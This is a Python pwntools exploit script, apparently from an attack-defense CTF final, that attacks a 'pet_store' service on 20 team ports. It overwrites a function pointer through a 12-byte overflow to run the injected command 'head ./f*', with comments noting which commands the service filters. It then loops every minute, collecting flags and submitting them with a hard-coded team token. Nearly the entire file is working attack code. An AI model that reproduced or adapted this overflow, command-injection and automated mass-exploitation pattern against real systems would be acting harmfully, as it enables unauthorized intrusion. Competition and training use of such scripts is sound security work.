#!usr/bin/python3
from pwn import *
import requests

# =========================================================
#                          SETUP                         
# =========================================================
exe = './pet_store'
# elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host = '172.16.0.250'

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x40192e
break *0x40196f
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit(port):
    global io
    # io = initialize()
    io = remote(host, port)

    io.sendlineafter(b'name:', b'bob123')
    
    # buy pet
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', b'3')
    
    # feed
    io.sendlineafter(b'>>', b'4')
    io.sendlineafter(b':', b'0')
    
    # name
    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b':', b'0')
    # io.sendlineafter(b':', b'cat ./flag.txt\x00') # filtered
    # io.sendlineafter(b':', b'tail ./f*\x00')      # filtered
    io.sendlineafter(b':', b'head ./f*\x00')
    
    # change func
    io.sendlineafter(b'>>', b'5')
    io.sendlineafter(b':', b'0')
    io.sendlineafter(b':', b'0')
    io.sendlineafter(b'[y/n]', b'y')
    payload = b'A' * 12 + b'\xd6\x12\x40'           # some filter this too
    io.sendafter(b':', payload)
    
    # get info (victim)
    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b':', b'0')
    
    flag = io.recvline().decode().strip()
    log.info(f'{port=}, {flag=}')
    flags.append(flag)

    io.close()
    
def submit():
    url = 'https://final.ascis.vn/flags'
    headers = {
        'Host': 'final.ascis.vn',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/json',
        'X-Team-Token': '718beff97ff769aa',
        'Origin': 'https://final.ascis.vn',
        'Referer': 'https://final.ascis.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Te': 'trailers',
        'Connection': 'close',
    }

    # convert flags list  to string
    data = "["
    for flag in flags:
        data += f'"{flag}",'
    data = data[:-1] + "]"

    response = requests.put(url, headers=headers, data=data)
    print(response.text) 
    
if __name__ == '__main__':
    global flags
    while(True):
        flags = []
        for i in range(1, 21):
            try:
                if i > 9:
                    port = int(f'1{i}01')
                    exploit(port)
                else:
                    port = int(f'10{i}01')
                    exploit(port)
            except:
                log.failure(f'failed {port=}')
            
        submit()
        time.sleep(60)